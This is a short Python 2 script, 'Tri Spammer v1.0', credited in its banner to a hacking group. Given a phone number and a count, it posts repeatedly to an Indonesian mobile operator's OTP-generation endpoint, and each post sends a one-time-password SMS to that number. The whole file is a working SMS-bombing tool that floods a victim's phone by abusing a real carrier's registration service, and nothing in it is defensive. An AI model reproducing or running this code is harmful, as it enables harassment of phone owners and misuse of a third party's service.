## tri.py - TRI SPAM (12-June-2018 [23:46])
# -*- coding: utf-8 -*-
##
import sys
import time
import requests

__banner__ = """
  _______  _______  ___ 
 |       ||   _   \|   | Tri Spammer v1.0
 |.|   | ||.  l   /|.  | Author: DedSecTL
 `-|.  |-'|.  _   1|.  | Codename: Alone.
   |:  |  |:  |   ||:  | Github: https://github.com/Gameye98
   |::.|  |::.|:. ||::.| Team: BlackHole Security
   `---'  `--- ---'`---' Made with full of \033[91m<3\033[0m
"""
def spam(jumlah, nomor):
	print __banner__
	count = 0
	while (count < int(jumlah.split("=")[1])):
		params = {'msisdn':nomor}
		r = requests.post("https://registrasi.tri.co.id/daftar/generateOTP", data=params)
		if r.json()["code"] == "200" and r.json()["status"] == "success":
			print "\033[92m[%s] status: %s\033[0m" % (r.json()["code"], r.json()["status"])
			count = count + 1
			time.sleep(2)
		elif r.json()["code"] == "400" and r.json()["status"] == "success":
			print "\033[91m[%s] status: %s\033[0m" % (r.json()["code"], r.json()["status"])
			count = count + 1
			time.sleep(3)
		else:
			print "\033[91m[%s] status: %s\033[0m" % (r.json()["code"], r.json()["status"])
			break
	print "\033[92m[000] status: stopped...\033[0m"

if __name__ == "__main__":
	if len(sys.argv) != 3:
		print __banner__
		print "Usage: tri.py --count=100 0896xxxxxx"
	else:
		spam(sys.argv[1], sys.argv[2])